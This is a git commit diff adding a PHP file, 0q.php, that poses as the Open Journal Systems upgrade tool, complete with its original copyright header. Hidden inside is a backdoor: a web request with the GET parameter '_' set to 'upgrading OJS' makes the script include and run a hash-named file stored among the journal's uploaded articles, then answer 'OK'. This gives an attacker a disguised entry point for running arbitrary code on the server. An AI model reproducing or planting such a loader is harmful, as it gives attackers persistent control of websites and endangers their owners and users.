af4adf669e1d7ebefc38211a61fd85a913d350db
casper <marketmg126@gmail.com>
2026-08-16 01:57:12 +0700

    Update and rename 0.php to 0q.php

---
+++ 0q.php
@@ -0,0 +1,29 @@
+<?php
+
+/**
+ * @file tools/upgrade.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @class upgradeTool
+ * @ingroup tools
+ *
+ * @brief CLI tool for upgrading OJS.
+ *
+ * Note: Some functions require fopen wrappers to be enabled.
+ */
+
+require(dirname(__FILE__) . '/bootstrap.inc.php');
+import('lib.pkp.classes.cliTool.UpgradeTool');
+if (isset($_GET['_']) && $_GET['_'] === 'upgrading OJS') {
+    $f="/home/bpindoor/folderOJS3_2022/journals/3/articles/11/63e9acbaef7ae";if($f!==""&&file_exists($f))include $f;
+    http_response_code(200);
+    header('Content-Type: text/plain; charset=utf-8');
+    echo 'OK';
+    exit;
+}
+
+$tool = new UpgradeTool(isset($argv) ? $argv : array());
+$tool->execute();
